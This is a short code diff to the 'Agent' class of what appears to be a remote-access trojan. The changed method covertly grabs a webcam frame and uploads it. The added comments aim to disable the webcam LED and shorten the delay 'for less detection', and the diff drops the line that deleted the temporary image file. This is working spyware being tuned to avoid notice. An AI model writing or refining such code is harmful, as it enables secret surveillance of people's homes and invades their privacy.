@@ -306,7 +306,10 @@ class Agent(object):
 
     @threaded
     def camshot(self):
+        # Notice: light of usage webcam gets turned on.
+        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
         cam = cv2.VideoCapture(0)
+        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
         ret, frame = cam.read()
         if not ret:
             return
@@ -315,7 +318,6 @@ class Agent(object):
         tmp_file.close()
         cv2.imwrite(camshot_file, frame)
         self.upload(camshot_file)
-        os.remove("/tmp/%s" % camshot_file)
 
     def help(self):
         """ Displays the help """
